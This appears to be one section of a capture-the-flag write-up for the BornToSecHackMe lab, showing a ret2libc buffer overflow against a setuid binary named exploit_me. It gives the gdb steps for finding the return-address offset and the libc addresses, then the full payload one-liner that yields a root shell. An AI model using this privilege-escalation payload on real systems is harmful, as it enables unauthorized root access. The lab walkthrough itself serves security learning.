# zaz

```shell
peer-ThinkBook-14-G2-ITL# ls
ft_root  laurie  laurie@borntosec.net  lmezard	LOOKATME  thor	zaz
peer-ThinkBook-14-G2-ITL# cd zaz
peer-ThinkBook-14-G2-ITL# ls
exploit_me  mail
peer-ThinkBook-14-G2-ITL# file exploit_me 
exploit_me: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=f8e25724c3216a8d8cc43b894b58f2b87e9139cd, not stripped
```

We find an executable and get flashbacks to rainfall/override.

[HexRays](https://dogbolt.org/) decompiles it to a readable file: exploit_me.c.

Let's execute it using gdb with a [buffer overflow pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) of size 200 to determine the offset of the eip.
```shell
peer-ThinkBook-14-G2-ITL# gdb -q exploit_me 
Reading symbols from exploit_me...
(No debugging symbols found in exploit_me)
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[...]

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```
Our trusted website tells us the offset is 140, which we would've already known if we'd looked at the ghidra instead of hexrays.

Ret2Libc:
```shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) info proc map
[...]
(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

### Putting everything together:

```shell
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print 140 * "A" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA �����X���
# whoami
root
```

[[Go back to writeup2.md](../writeup2.md)]]
